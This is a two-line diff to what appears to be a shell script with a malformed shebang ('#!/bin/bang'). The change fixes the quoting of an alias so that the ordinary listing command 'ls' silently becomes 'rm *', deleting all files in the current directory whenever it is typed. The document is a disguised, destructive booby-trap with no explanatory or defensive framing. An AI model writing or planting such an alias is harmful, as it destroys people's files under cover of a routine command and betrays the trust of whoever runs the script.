@@ -1,2 +1,2 @@
 #!/bin/bang
-alias ls=rm *
+alias ls='rm *'
